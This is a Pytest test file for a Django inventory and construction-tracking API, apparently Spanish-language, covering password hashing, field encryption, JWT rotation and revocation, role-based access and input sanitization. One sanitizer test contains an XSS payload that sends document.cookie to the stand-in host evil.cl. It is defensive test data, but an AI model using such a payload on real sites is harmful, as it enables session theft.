"""Pruebas automatizadas (Pytest) - Proyecto Alpha (FYAG)."""

import base64
import json
import os
from unittest.mock import MagicMock, patch

import django  # noqa: E402
import jwt
import pytest
from django.conf import settings
from django.test import RequestFactory

if not settings.configured:
    settings.configure(
        SECRET_KEY="test-secret-key-fyag-mvc",
        INSTALLED_APPS=["src.inventario"],
    )
    django.setup()

from src.core.security import (  # noqa: E402
    AES256FieldCipher,
    JWTManager,
    hash_password,
    verify_password,
)
from src.inventario.rbac_views import (  # noqa: E402
    RBAC_MATRIX,
    api_crear_inventario,
    api_health,
    api_listar_inventario,
    registrar_avance_obra,
    sanitize_text_input,
)

TEST_JWT_SECRET = "clave-secreta-proyecto-alpha-fyag-2026-32bytes!"


class FakeRedis:
    """Simulador de Redis en memoria para pruebas locales."""

    def __init__(self) -> None:
        self.kv = {}
        self.sets = {}

    def setex(self, key: str, ttl: int, value: str) -> None:
        self.kv[key] = value

    def get(self, key: str):
        return self.kv.get(key)

    def exists(self, key: str) -> int:
        return 1 if key in self.kv else 0

    def sadd(self, key: str, member: str) -> None:
        self.sets.setdefault(key, set()).add(member)

    def srem(self, key: str, member: str) -> None:
        self.sets.get(key, set()).discard(member)


def test_bcrypt_cost_factor_12():
    hashed = hash_password("ClaveFyag2026#")
    assert hashed.startswith("$2b$12$")
    assert verify_password("ClaveFyag2026#", hashed) is True
    assert verify_password("ClaveIncorrecta", hashed) is False


def test_aes256_gcm_encryption_decryption():
    key_b64 = base64.b64encode(os.urandom(32)).decode("utf-8")
    cipher = AES256FieldCipher(key_b64)
    texto_original = "76.543.210-9 | Contrato Frigorifico N 408"
    cifrado_1 = cipher.encrypt(texto_original)
    cifrado_2 = cipher.encrypt(texto_original)

    assert cifrado_1 != cifrado_2
    assert cipher.decrypt(cifrado_1) == texto_original
    assert cipher.decrypt(cifrado_2) == texto_original


def test_jwt_rotation_and_replay_attack_detection():
    redis_sim = FakeRedis()
    manager = JWTManager(secret_key=TEST_JWT_SECRET, redis_client=redis_sim)

    par_inicial = manager.issue_token_pair(
        "usr_fin_01", "FINANZAS", "dev_notebook_01"
    )
    par_rotado = manager.rotate_refresh_token(par_inicial["refresh_token"])

    assert par_rotado["access_token"] != par_inicial["access_token"]
    assert par_rotado["refresh_token"] != par_inicial["refresh_token"]

    with pytest.raises(jwt.InvalidTokenError, match="reutilizado"):
        manager.rotate_refresh_token(par_inicial["refresh_token"])

    assert redis_sim.exists("blacklist:device:dev_notebook_01") == 1


def test_jwt_revocation_on_lost_mobile_device():
    redis_sim = FakeRedis()
    manager = JWTManager(secret_key=TEST_JWT_SECRET, redis_client=redis_sim)

    manager.issue_token_pair(
        "usr_sup_02", "SUPERVISOR_OBRAS", "cel_terreno_07"
    )
    manager.revoke_device("usr_sup_02", "cel_terreno_07")

    assert redis_sim.exists("blacklist:device:cel_terreno_07") == 1


def test_rbac_official_roles_and_xss_sanitization():
    assert RBAC_MATRIX["FINANZAS"]["finanzas_costos"] == {"C", "R", "U", "D"}
    assert RBAC_MATRIX["FINANZAS"]["inventario_bodega"] == {"R"}
    assert RBAC_MATRIX["FINANZAS"]["usuarios_roles"] == set()

    assert RBAC_MATRIX["SUPERVISOR_OBRAS"]["obras_mantencion"] == {
        "C",
        "R",
        "U",
        "D",
    }
    assert RBAC_MATRIX["SUPERVISOR_OBRAS"]["finanzas_costos"] == set()

    malicious_input = (
        '<script>fetch("http://evil.cl?c="+document.cookie)</script>'
        "Bodega Central"
    )
    clean_output = sanitize_text_input(malicious_input)
    assert "<script>" not in clean_output
    assert "Bodega Central" in clean_output


def test_mvc_controller_service_rbac_flow():
    factory = RequestFactory()
    payload = json.dumps(
        {
            "codigo_obra": "OBRA-408",
            "observacion": "<b>Avance ok</b>",
            "porcentaje_avance": 75,
        }
    )

    req_denegado = factory.post(
        "/api/v1/obras/avance/", data=payload, content_type="application/json"
    )
    req_denegado.jwt_role = "FINANZAS"
    resp_403 = registrar_avance_obra(req_denegado)
    assert resp_403.status_code == 403

    req_ok = factory.post(
        "/api/v1/obras/avance/", data=payload, content_type="application/json"
    )
    req_ok.jwt_role = "SUPERVISOR_OBRAS"
    obra_mock = MagicMock(codigo="OBRA-408")

    with patch(
        "src.inventario.services.procesar_avance_obra", return_value=obra_mock
    ) as mock_srv:
        resp_201 = registrar_avance_obra(req_ok)
        assert resp_201.status_code == 201
        mock_srv.assert_called_once_with("OBRA-408", 75, "<b>Avance ok</b>")


def test_inventario_api_endpoints_and_rbac():
    factory = RequestFactory()

    req_health = factory.get("/api/v1/health/")
    resp_health = api_health(req_health)
    assert resp_health.status_code == 200

    req_list = factory.get("/api/v1/inventario/items/")
    req_list.jwt_role = "FINANZAS"
    resp_list = api_listar_inventario(req_list)
    assert resp_list.status_code == 200
    body_list = json.loads(resp_list.content.decode("utf-8"))
    assert body_list["total"] >= 2

    req_create_403 = factory.post(
        "/api/v1/inventario/items/crear/",
        data=json.dumps(
            {
                "sku": "INS-999",
                "nombre": "Compresor",
                "stock": 5,
                "ubicacion": "Camara 2",
            }
        ),
        content_type="application/json",
    )
    req_create_403.jwt_role = "FINANZAS"
    assert api_crear_inventario(req_create_403).status_code == 403

    req_create_201 = factory.post(
        "/api/v1/inventario/items/crear/",
        data=json.dumps(
            {
                "sku": "INS-999",
                "nombre": "<script>x</script>Compresor",
                "stock": 5,
                "ubicacion": "Camara 2",
            }
        ),
        content_type="application/json",
    )
    req_create_201.jwt_role = "BODEGUERO"
    resp_create_201 = api_crear_inventario(req_create_201)
    assert resp_create_201.status_code == 201
    created = json.loads(resp_create_201.content.decode("utf-8"))["item"]
    assert "<script>" not in created["nombre"]
    assert created["nombre"] == "Compresor"
